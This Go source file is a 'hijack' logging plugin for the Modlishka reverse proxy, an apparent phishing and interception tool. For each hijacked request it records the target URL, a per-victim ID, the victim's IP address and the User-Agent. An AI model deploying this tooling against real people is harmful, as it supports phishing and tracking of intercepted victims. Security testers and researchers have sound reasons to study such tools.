/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package plugin

import (
	"github.com/drk1wi/Modlishka/log"
	"github.com/drk1wi/Modlishka/runtime"
	"net/http"
	"strings"
)

func init() {

	s := Property{}
	s.Name = "hijack"
	s.Description = "This is a hijack log plugin - it will log all of the hijacked requests"
	s.Version = "0.1"

	//init all of the vars, print a welcome message, init your command line flags here
	s.Init = func() {}

	// process all of the cmd line flags and config file (if supplied)
	s.Flags = func() {
	}

	//process HTTP request
	s.HTTPRequest = func(req *http.Request, context *HTTPContext) {

		if runtime.DynamicMode == false {
			return
		}

		if strings.Contains(context.OriginalTarget, runtime.ProxyDomain) == false && context.IsTLS == false {

			log.Warningf("Hijack plugin: Clear-text [%s%s]\n\tID: [%s] \n\tIP: [%s] \n\tUser-Agent: [%s]\n", context.Target, req.URL.Path, context.UserID, context.IP, req.Header.Get("User-Agent"))
		}

		if strings.Contains(context.OriginalTarget, runtime.ProxyDomain) == false && context.IsTLS == true {

			log.Warningf("Hijack plugin: TLS URL [%s%s]\n\tID: [%s] \n\tIP: [%s] \n\tUser-Agent: [%s]\n", context.Target, req.URL.Path, context.UserID, context.IP, req.Header.Get("User-Agent"))
		}

		if strings.Contains(context.OriginalTarget, runtime.ProxyDomain) && context.IsTLS == true {

			log.Warningf("Hijack plugin: Hijacked TLS URL [%s%s]\n\tID: [%s] \n\tIP: [%s] \n\tUser-Agent: [%s]\n", context.Target, req.URL.Path, context.UserID, context.IP, req.Header.Get("User-Agent"))
		}

		if strings.Contains(context.OriginalTarget, runtime.ProxyDomain) && context.IsTLS == false {

			log.Warningf("Hijack plugin: Hijacked clear-text URL [%s%s]\n\tID: [%s] \n\tIP: [%s] \n\tUser-Agent: [%s]\n", context.Target, req.URL.Path, context.UserID, context.IP, req.Header.Get("User-Agent"))
		}

	}

	//process HTTP response (responses can arrive in random order)
	s.HTTPResponse = func(resp *http.Response, context *HTTPContext, buffer *[]byte) {

	}

	// Register your http handlers
	s.RegisterHandler = func(handler *http.ServeMux) {

	}

	// Register all the function hooks
	s.Register()

}
